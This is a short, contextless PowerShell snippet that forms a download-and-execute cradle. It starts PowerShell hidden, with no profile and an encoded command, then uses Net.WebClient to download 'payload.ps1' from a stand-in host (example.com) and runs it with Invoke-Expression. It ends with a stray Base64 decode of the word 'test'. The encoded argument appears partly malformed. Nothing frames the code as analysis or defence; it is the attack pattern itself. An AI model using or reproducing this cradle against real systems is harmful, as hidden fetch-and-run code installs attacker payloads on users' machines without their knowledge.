powershell.exe -nop -w hidden -enc JABzAD0AaAB0AHQAcAA6AC8ALwBleGFtcGxlAC4AY29tAA==
$data = New-Object Net.WebClient
IEX ($data.DownloadString('http://example.com/payload.ps1'))
[System.Convert]::FromBase64String("dGVzdA==")
